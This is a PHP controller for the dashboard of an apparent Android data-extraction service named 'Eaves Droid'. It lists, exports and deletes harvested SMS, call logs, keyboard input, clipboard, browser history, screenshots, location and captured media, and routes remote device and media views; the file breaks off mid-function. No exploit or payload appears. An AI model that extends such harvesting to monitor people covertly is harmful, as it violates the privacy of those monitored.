<?php

namespace App\Controllers\clients;

use App\Models\CryptModel;
use CodeIgniter\API\ResponseTrait;

class AdvancedController extends BaseClientController
{
    use ResponseTrait;

    /** GET /advanced/hardware */
    public function hardware()
    {
        $subModel = new \App\Models\SubscriptionModel();
        $userTier = $subModel->getPlanTier($this->userId);
        $counts = $this->getUserDataCounts();
        
        $db = \Config\Database::connect();
        $features = $db->table('tbl_feature_tiers')
                       ->where('category_type', 'hardware')
                       ->get()
                       ->getResultArray();

        return $this->renderAppView('users/advanced/hardware', [
            'pag' => 'advanced',
            'active_tab' => 'hardware_landing',
            'title' => 'Hardware',
            'counts' => $counts,
            'userTier' => $userTier,
            'features' => $features,
        ]);
    }

    /** GET /advanced/software */
    public function software()
    {
        $subModel = new \App\Models\SubscriptionModel();
        $userTier = $subModel->getPlanTier($this->userId);
        $counts = $this->getUserDataCounts();

        $db = \Config\Database::connect();
        $features = $db->table('tbl_feature_tiers')
                       ->where('category_type', 'software')
                       ->get()
                       ->getResultArray();

        return $this->renderAppView('users/advanced/software', [
            'pag' => 'advanced',
            'active_tab' => 'software_landing',
            'title' => 'Software',
            'counts' => $counts,
            'userTier' => $userTier,
            'features' => $features,
        ]);
    }

    /**
     * Unified delete — removes ALL user data across every extractor category.
     * Includes DB records AND uploaded files on disk. Sends an email notification.
     */
    public function delete_all_user_data()
    {
        if (!$this->requireAuth()) {
            return;
        }

        $userId = $this->userId;
        $model = new \App\Models\FinderModel();
        $result = $model->deleteAllUserData($userId);

        if ($result['success']) {
            $this->session->setFlashdata('success', 'All user data has been permanently deleted. A confirmation email has been sent.');

            if (!empty($this->userData['email']) && ($this->userData['email_notifications'] ?? true)) {
                $this->sendDeleteNotificationEmail($userId, $result['deleted'], $result['total_deleted']);
            }
        } else {
            $this->session->setFlashdata('error', 'Failed to delete some data. Check logs for details.');
        }

        redirect()->back();
    }

    /**
     * Unified export — returns a structured report of all user data organized by extractor category.
     * Sends an email notification with estimated sizes.
     */
    public function export_all_user_data()
    {
        if (!$this->requireAuth()) {
            return;
        }

        $userId = $this->userId;
        $model = new \App\Models\FinderModel();
        $data = $model->exportAllUserData($userId);

        if (!empty($this->userData['email']) && ($this->userData['email_notifications'] ?? true)) {
            $this->sendExportNotificationEmail($userId, $data);
        }

        header('Content-Type: application/json');
        header('Content-Disposition: ' . 'attachment; filename="data_export_' . $userId . '_' . date('Ymd_His') . '.json"');
        echo json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        exit;
    }

    /**
     * Sends an HTML email notification confirming data deletion.
     */
    private function sendDeleteNotificationEmail(int $userId, array $deleted, int $totalDeleted): void
    {
        try {
            helper('email');
            
            $username = $this->userData['username'] ?? 'User';
            $asAtTimestamp = date('Y-m-d H:i:s');

            $categoryLabels = [
                'sms' => 'SMS Messages',
                'calls' => 'Call Logs',
                'contacts' => 'Contacts',
                'apps' => 'Installed Apps',
                'location' => 'LocationController History',
                'activity' => 'Activity Log',
                'files' => 'Device Files',
                'sim_configs' => 'SIM Configurations',
                'device_context' => 'Device Context',
                'network_info' => 'Network Info',
                'nearby_wifi' => 'Nearby Wi-Fi',
                'accounts' => 'Accounts',
                'calendar' => 'Calendar Events',
                'bluetooth' => 'Bluetooth',
                'bluetooth_paired' => 'Paired Bluetooth Devices',
                'sensors' => 'Sensor Profile',
                'device_profile' => 'Device Profile',
                'proc_info' => 'Process Info',
                'running_processes' => 'Running Processes',
                'running_process_details' => 'Process Details',
                'running_services' => 'Running Services',
                'camera_info' => 'Camera Info',
                'battery_stats' => 'Battery Stats',
                'accessibility' => 'Accessibility Services',
                'input_methods' => 'Input Methods',
                'input_method_subtypes' => 'Input Subtypes',
                'cell_towers' => 'Cell Tower Data',
                'display_info' => 'Display Info',
                'storage' => 'Storage',
                'thermal' => 'Thermal Data',
                'nfc' => 'NFC Data',
                'hardware_graphics' => 'Graphics Hardware',
                'hardware_network' => 'Network Hardware',
                'app_security' => 'App Security',
                'network_security' => 'Network Security',
                'telephony_network' => 'Telephony Network',
                'system_locale' => 'System Locale',
                'apps_notifications' => 'App Notifications',
                'misc_software' => 'Misc Software Data',
                'misc_hardware' => 'Misc Hardware Data',
                'tbl_uploaded_files' => 'Uploaded Files',
                'captured_media' => 'Captured Media',
                'user_actions' => 'User Actions',
                'device_config' => 'Device Config',
                'app_defaults' => 'App Defaults',
            ];

            $tableLabels = [
                'tbl_extracted_sms' => 'SMS Messages',
                'tbl_extracted_call_logs' => 'Call Logs',
                'tbl_extracted_contacts' => 'Contacts',
                'tbl_extracted_installed_apps' => 'Installed Apps',
                'tbl_extracted_locations' => 'LocationController History',
                'tbl_extracted_activities' => 'Activity Log',
                'tbl_extracted_device_files' => 'Device Files',
                'tbl_sim_configs' => 'SIM Configs',
                'tbl_device_hardware_contexts' => 'Device Context',
                'tbl_system_network_info' => 'Network Info',
                'tbl_telemetry_wifi_networks_nearby' => 'Nearby Wi-Fi',
                'tbl_accounts' => 'Accounts',
                'tbl_extracted_calendar_events' => 'Calendar Events',
                'tbl_telemetry_bluetooth_devices' => 'Bluetooth',
                'tbl_telemetry_bluetooth_devices_paired' => 'Paired Bluetooth',
                'tbl_telemetry_sensors' => 'Sensor Profile',
                'tbl_device_profiles' => 'Device Profile',
                'tbl_system_running_processes' => 'Process Info',
                'tbl_running_processes' => 'Running Processes',
                'tbl_system_running_process_details' => 'Process Details',
                'tbl_system_running_services' => 'Running Services',
                'tbl_telemetry_cameras' => 'Camera Info',
                'tbl_telemetry_battery_stats' => 'Battery Stats',
                'tbl_system_accessibility_services' => 'Accessibility Services',
                'tbl_system_input_methods' => 'Input Methods',
                'tbl_system_input_method_subtypes' => 'Input Subtypes',
                'tbl_telemetry_cell_towers' => 'Cell Tower Data',
                'tbl_telemetry_display_info' => 'Display Info',
                'tbl_telemetry_storage_stats' => 'Storage',
                'tbl_telemetry_thermal' => 'Thermal Data',
                'tbl_telemetry_nfc' => 'NFC Data',
                'tbl_hardware_graphics' => 'Graphics Hardware',
                'tbl_hardware_network' => 'Network Hardware',
                'tbl_system_app_security' => 'App Security',
                'tbl_network_security' => 'Network Security',
                'tbl_telephony_network' => 'Telephony Network',
                'tbl_system_locale' => 'System Locale',
                'tbl_system_app_usage' => 'App Usage',
                'tbl_system_app_usage_sessions' => 'App Usage Sessions',
                'tbl_extracted_notifications' => 'Notifications',
                'tbl_data_usage' => 'Data Usage',
                'tbl_telemetry_wifi_networks' => 'Saved Wi-Fi',
                'tbl_system_default_apps_device' => 'Default Apps',
                'tbl_system_alarms' => 'Alarms',
                'tbl_extracted_media_files' => 'Captured Media',
                'tbl_user_actions' => 'User Actions',
                'tbl_device_configs' => 'Device Config',
                'tbl_system_default_apps' => 'App Defaults',
                'tbl_system_app_permissions' => 'App Permissions',
                'tbl_extracted_browser_history' => 'Browser History',
                'tbl_extracted_clipboard_entries' => 'Clipboard Data',
                'tbl_content_providers' => 'Content Providers',
                'tbl_system_crash_logs' => 'Crash Logs',
                'tbl_system_digital_wellbeing' => 'Digital Wellbeing',
                'tbl_system_digital_wellbeing_apps' => 'Wellbeing App Timers',
                'tbl_system_doze_standby' => 'Doze & Standby',
                'tbl_system_doze_standby_apps' => 'Standby Buckets',
                'tbl_extracted_email_accounts' => 'Email Accounts',
                'tbl_health_data' => 'Health Data',
                'tbl_keyboard_input' => 'Keyboard Input',
                'tbl_system_keyguard_events' => 'Keyguard Events',
                'tbl_extracted_screenshots' => 'Screenshots',
                'tbl_screen_state' => 'Screen State',
                'tbl_vpn_config' => 'VPN Configuration',
                'tbl_system_running_processes_detailed' => 'Running Processes',
                'tbl_telemetry_audio_devices' => 'Audio Devices',
                'tbl_audio_volumes' => 'Audio Volume Profiles',
                'tbl_biometric' => 'Biometric',
                'tbl_telemetry_gnss_hardware' => 'GNSS Hardware',
                'tbl_telemetry_power_rails' => 'Power Rails',
                'tbl_telemetry_usb_devices' => 'USB Devices',
                'tbl_telemetry_vibration' => 'Vibration',
            ];

            // Build detailed category data from deleted array
            $categoriesWithTables = [];
            foreach (\App\Models\FinderModel::TABLE_REGISTRY as $catKey => $tables) {
                $tableList = is_array($tables) ? $tables : [$tables];
                $tablesList = [];
                foreach ($tableList as $table) {
                    if (!isset($deleted[$table])) continue;
                    $tablesList[] = [
                        'name'  => $table,
                        'count' => $deleted[$table],
                        'label' => $tableLabels[$table] ?? $table,
                    ];
                }
                if (!empty($tablesList)) {
                    $categoriesWithTables[$catKey] = [
                        'tables'       => $tablesList,
                        'total_rows'   => array_sum(array_column($tablesList, 'count')),
                    ];
                }
            }

            $emailData = [
                'username'             => $username,
                'asAtTimestamp'        => $asAtTimestamp,
                'categories'           => $categoriesWithTables,
                'categoryLabels'       => $categoryLabels,
                'totalDeleted'         => $totalDeleted,
                // Security Audit Metadata
                'securityAction'       => 'Data Deletion',
                'securityDescription'  => 'Permanently deleted device logs and diagnostics',
                'securityStatus'       => 'completed',
            ];

            send_templated_email($this->userData['email'], 'Eaves Droid — Data Deletion Confirmation', 'email/data_delete_notification', $emailData);
            log_message('info', 'Delete notification email sent to user ' . $userId);
        } catch (\Exception $e) {
            log_message('error', 'Failed to send delete notification email to user ' . $userId . ' — ' . $e->getMessage());
        }
    }

    /**
     * Sends an HTML email notification confirming data export with estimated sizes.
     */
    private function sendExportNotificationEmail(int $userId, array $data): void
    {
        try {
            helper('email');
            $username = $this->userData['username'] ?? 'User';

            $categoryLabels = [
                'sms' => 'SMS Messages',
                'calls' => 'Call Logs',
                'contacts' => 'Contacts',
                'apps' => 'Installed Apps',
                'location' => 'LocationController History',
                'activity' => 'Activity Log',
                'files' => 'Device Files',
                'sim_configs' => 'SIM Configurations',
                'device_context' => 'Device Context',
                'network_info' => 'Network Info',
                'nearby_wifi' => 'Nearby Wi-Fi',
                'accounts' => 'Accounts',
                'calendar' => 'Calendar Events',
                'bluetooth' => 'Bluetooth',
                'bluetooth_paired' => 'Paired Bluetooth Devices',
                'sensors' => 'Sensor Profile',
                'device_profile' => 'Device Profile',
                'proc_info' => 'Process Info',
                'running_processes' => 'Running Processes',
                'running_process_details' => 'Process Details',
                'running_services' => 'Running Services',
                'camera_info' => 'Camera Info',
                'battery_stats' => 'Battery Stats',
                'accessibility' => 'Accessibility Services',
                'input_methods' => 'Input Methods',
                'input_method_subtypes' => 'Input Subtypes',
                'cell_towers' => 'Cell Tower Data',
                'display_info' => 'Display Info',
                'storage' => 'Storage',
                'thermal' => 'Thermal Data',
                'nfc' => 'NFC Data',
                'hardware_graphics' => 'Graphics Hardware',
                'hardware_network' => 'Network Hardware',
                'app_security' => 'App Security',
                'network_security' => 'Network Security',
                'telephony_network' => 'Telephony Network',
                'system_locale' => 'System Locale',
                'apps_notifications' => 'App Notifications',
                'misc_software' => 'Misc Software Data',
                'misc_hardware' => 'Misc Hardware Data',
                'tbl_uploaded_files' => 'Uploaded Files',
                'captured_media' => 'Captured Media',
                'user_actions' => 'User Actions',
                'device_config' => 'Device Config',
                'app_defaults' => 'App Defaults',
            ];

            $tableLabels = [
                'tbl_extracted_sms' => 'SMS Messages',
                'tbl_extracted_call_logs' => 'Call Logs',
                'tbl_extracted_contacts' => 'Contacts',
                'tbl_extracted_installed_apps' => 'Installed Apps',
                'tbl_extracted_locations' => 'LocationController History',
                'tbl_extracted_activities' => 'Activity Log',
                'tbl_extracted_device_files' => 'Device Files',
                'tbl_sim_configs' => 'SIM Configs',
                'tbl_device_hardware_contexts' => 'Device Context',
                'tbl_system_network_info' => 'Network Info',
                'tbl_telemetry_wifi_networks_nearby' => 'Nearby Wi-Fi',
                'tbl_accounts' => 'Accounts',
                'tbl_extracted_calendar_events' => 'Calendar Events',
                'tbl_telemetry_bluetooth_devices' => 'Bluetooth',
                'tbl_telemetry_bluetooth_devices_paired' => 'Paired Bluetooth',
                'tbl_telemetry_sensors' => 'Sensor Profile',
                'tbl_device_profiles' => 'Device Profile',
                'tbl_system_running_processes' => 'Process Info',
                'tbl_running_processes' => 'Running Processes',
                'tbl_system_running_process_details' => 'Process Details',
                'tbl_system_running_services' => 'Running Services',
                'tbl_telemetry_cameras' => 'Camera Info',
                'tbl_telemetry_battery_stats' => 'Battery Stats',
                'tbl_system_accessibility_services' => 'Accessibility Services',
                'tbl_system_input_methods' => 'Input Methods',
                'tbl_system_input_method_subtypes' => 'Input Subtypes',
                'tbl_telemetry_cell_towers' => 'Cell Tower Data',
                'tbl_telemetry_display_info' => 'Display Info',
                'tbl_telemetry_storage_stats' => 'Storage',
                'tbl_telemetry_thermal' => 'Thermal Data',
                'tbl_telemetry_nfc' => 'NFC Data',
                'tbl_hardware_graphics' => 'Graphics Hardware',
                'tbl_hardware_network' => 'Network Hardware',
                'tbl_system_app_security' => 'App Security',
                'tbl_network_security' => 'Network Security',
                'tbl_telephony_network' => 'Telephony Network',
                'tbl_system_locale' => 'System Locale',
                'tbl_system_app_usage' => 'App Usage',
                'tbl_system_app_usage_sessions' => 'App Usage Sessions',
                'tbl_extracted_notifications' => 'Notifications',
                'tbl_data_usage' => 'Data Usage',
                'tbl_telemetry_wifi_networks' => 'Saved Wi-Fi',
                'tbl_system_default_apps_device' => 'Default Apps',
                'tbl_system_alarms' => 'Alarms',
                'tbl_extracted_media_files' => 'Captured Media',
                'tbl_user_actions' => 'User Actions',
                'tbl_device_configs' => 'Device Config',
                'tbl_system_default_apps' => 'App Defaults',
                'tbl_system_app_permissions' => 'App Permissions',
                'tbl_extracted_browser_history' => 'Browser History',
                'tbl_extracted_clipboard_entries' => 'Clipboard Data',
                'tbl_content_providers' => 'Content Providers',
                'tbl_system_crash_logs' => 'Crash Logs',
                'tbl_system_digital_wellbeing' => 'Digital Wellbeing',
                'tbl_system_digital_wellbeing_apps' => 'Wellbeing App Timers',
                'tbl_system_doze_standby' => 'Doze & Standby',
                'tbl_system_doze_standby_apps' => 'Standby Buckets',
                'tbl_extracted_email_accounts' => 'Email Accounts',
                'tbl_health_data' => 'Health Data',
                'tbl_keyboard_input' => 'Keyboard Input',
                'tbl_system_keyguard_events' => 'Keyguard Events',
                'tbl_extracted_screenshots' => 'Screenshots',
                'tbl_screen_state' => 'Screen State',
                'tbl_vpn_config' => 'VPN Configuration',
                'tbl_system_running_processes_detailed' => 'Running Processes',
                'tbl_telemetry_audio_devices' => 'Audio Devices',
                'tbl_audio_volumes' => 'Audio Volume Profiles',
                'tbl_biometric' => 'Biometric',
                'tbl_telemetry_gnss_hardware' => 'GNSS Hardware',
                'tbl_telemetry_power_rails' => 'Power Rails',
                'tbl_telemetry_usb_devices' => 'USB Devices',
                'tbl_telemetry_vibration' => 'Vibration',
            ];

            $categoriesWithTables = [];
            foreach ($data['categories'] as $catKey => $catData) {
                $tables = [];
                foreach ($catData['tables'] as $tbl) {
                    $tables[] = [
                        'name'                 => $tbl['name'],
                        'count'                => $tbl['count'],
                        'estimated_size_human' => $tbl['estimated_size_human'],
                        'label'                => $tableLabels[$tbl['name']] ?? $tbl['name'],
                    ];
                }
                $categoriesWithTables[$catKey] = [
                    'tables'             => $tables,
                    'total_rows'         => $catData['total_rows'],
                    'total_size_human'   => $catData['total_size_human'],
                ];
            }

            $emailData = [
                'username'             => $username,
                'asAtTimestamp'        => date('Y-m-d H:i:s'),
                'categories'           => $categoriesWithTables,
                'categoryLabels'       => $categoryLabels,
                'totalRows'            => $data['total_rows'],
                'totalSizeHuman'       => $data['total_size_human'],
                // Security Audit Metadata
                'securityAction'       => 'Data Export',
                'securityDescription'  => 'Requested backup copy of device logs and diagnostics',
                'securityStatus'       => 'completed',
            ];

            send_templated_email($this->userData['email'], 'Eaves Droid — Data Export Complete', 'email/data_export_notification', $emailData);
            log_message('info', 'Export notification email sent to user ' . $userId);
        } catch (\Exception $e) {
            log_message('error', 'Failed to send export notification email to user ' . $userId . ' — ' . $e->getMessage());
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // DELEGATED ACTIONS
    // ═══════════════════════════════════════════════════════════════

    // ── ForensicsSystemController Delegations ──

    public function device_context()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->device_context();
    }

    public function delete_device_context($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_device_context($id);
    }

    public function network_info()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->network_info();
    }

    public function delete_network_info($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_network_info($id);
    }

    public function battery_stats()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->battery_stats();
    }

    public function delete_battery_stats($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_battery_stats($id);
    }

    public function processes()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->processes();
    }

    public function delete_processes($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_processes($id);
    }

    public function proc_info()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->proc_info();
    }

    public function delete_proc_info($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_proc_info($id);
    }

    public function running_processes()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->running_processes();
    }

    public function delete_running_processes($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_running_processes($id);
    }

    public function display_info()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->display_info();
    }

    public function delete_display_info($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_display_info($id);
    }

    public function storage()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->storage();
    }

    public function delete_storage($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_storage($id);
    }

    public function hardware_graphics()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->hardware_graphics();
    }

    public function delete_hardware_graphics($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_hardware_graphics($id);
    }

    public function data_usage()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->data_usage();
    }

    public function delete_data_usage($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_data_usage($id);
    }

    public function saved_wifi()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->saved_wifi();
    }

    public function delete_saved_wifi($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_saved_wifi($id);
    }

    public function hardware_network()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->hardware_network();
    }

    public function delete_hardware_network($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_hardware_network($id);
    }

    public function power_rails()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->power_rails();
    }

    public function delete_power_rails($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_power_rails($id);
    }

    public function usb_devices()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->usb_devices();
    }

    public function delete_usb_devices($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_usb_devices($id);
    }

    public function network_security()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->network_security();
    }

    public function delete_network_security($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_network_security($id);
    }

    public function vpn_config()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->vpn_config();
    }

    public function delete_vpn_config($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_vpn_config($id);
    }

    public function telephony_network()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->telephony_network();
    }

    public function delete_telephony_network($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_telephony_network($id);
    }

    public function crash_logs()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->crash_logs();
    }

    public function delete_crash_logs($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_crash_logs($id);
    }

    public function doze_standby()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->doze_standby();
    }

    public function delete_doze_standby($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_doze_standby($id);
    }

    public function hardware_dashboard()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->hardware_dashboard();
    }

    public function delete_hardware_dashboard($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_hardware_dashboard($id);
    }

    public function battery_power()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->battery_power();
    }

    public function delete_battery_power($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_battery_power($id);
    }

    public function system_performance()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->system_performance();
    }

    public function delete_system_performance($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_system_performance($id);
    }

    public function network_connectivity()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->network_connectivity();
    }

    public function delete_network_connectivity($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_network_connectivity($id);
    }

    public function display_graphics()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->display_graphics();
    }

    public function delete_display_graphics($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_display_graphics($id);
    }

    public function storage_peripherals()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->storage_peripherals();
    }

    public function delete_storage_peripherals($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_storage_peripherals($id);
    }

    public function device_fingerprint()
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->device_fingerprint();
    }

    public function delete_device_fingerprint($id)
    {
        $c = new ForensicsSystemController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_device_fingerprint($id);
    }


    // ── ForensicsEnvironmentController Delegations ──

    public function bluetooth()
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->bluetooth();
    }

    public function delete_bluetooth_row($id)
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_bluetooth_row($id);
    }

    public function sensors()
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->sensors();
    }

    public function delete_sensor_profile($id)
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_sensor_profile($id);
    }

    public function cell_towers()
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->cell_towers();
    }

    public function delete_cell_towers($id)
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_cell_towers($id);
    }

    public function thermal()
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->thermal();
    }

    public function delete_thermal($id)
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_thermal($id);
    }

    public function nfc()
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->nfc();
    }

    public function delete_nfc($id)
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_nfc($id);
    }

    public function gnss_hardware()
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->gnss_hardware();
    }

    public function delete_gnss_hardware($id)
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_gnss_hardware($id);
    }

    public function vibration()
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->vibration();
    }

    public function delete_vibration($id)
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_vibration($id);
    }

    public function sensors_location()
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->sensors_location();
    }

    public function delete_sensors_location($id)
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_sensors_location($id);
    }

    public function shortrange_auth()
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->shortrange_auth();
    }

    public function delete_shortrange_auth($id)
    {
        $c = new ForensicsEnvironmentController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_shortrange_auth($id);
    }


    // ── ForensicsUserController Delegations ──

    public function accounts()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->accounts();
    }

    public function delete_accounts_row($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_accounts_row($id);
    }

    public function timeline()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->timeline();
    }

    public function calendar()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->calendar();
    }

    public function delete_calendar_event($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_calendar_event($id);
    }

    public function app_usage()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->app_usage();
    }

    public function app_usage_detail(string $encodedPkg)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->app_usage_detail($encodedPkg);
    }

    public function delete_app_usage($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_app_usage($id);
    }

    public function delete_app_usage_by_package($encodedPkg)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_app_usage_by_package($encodedPkg);
    }

    public function notifications()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->notifications();
    }

    public function notification_detail(string $encodedPkg)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->notification_detail($encodedPkg);
    }

    public function delete_notification_row($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_notification_row($id);
    }

    public function delete_notifications_by_app($pkgEnc = null)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_notifications_by_app($pkgEnc);
    }

    public function security_audit()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->security_audit();
    }

    public function delete_security_audit_row($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_security_audit_row($id);
    }

    public function remote_device()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->remote_device();
    }

    public function remote_media()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->remote_media();
    }

    public function serve_media($filename)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->serve_media($filename);
    }

    public function delete_media($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_media($id);
    }

    public function camera_info()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->camera_info();
    }

    public function delete_camera_info($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_camera_info($id);
    }

    public function accessibility()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->accessibility();
    }

    public function delete_accessibility($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_accessibility($id);
    }

    public function input_methods()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->input_methods();
    }

    public function delete_input_methods($id)
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->delete_input_methods($id);
    }

    public function default_apps()
    {
        $c = new ForensicsUserController();
        $c->initController($this->request, $this->response, $this->logger);
        return $c->default_apps();
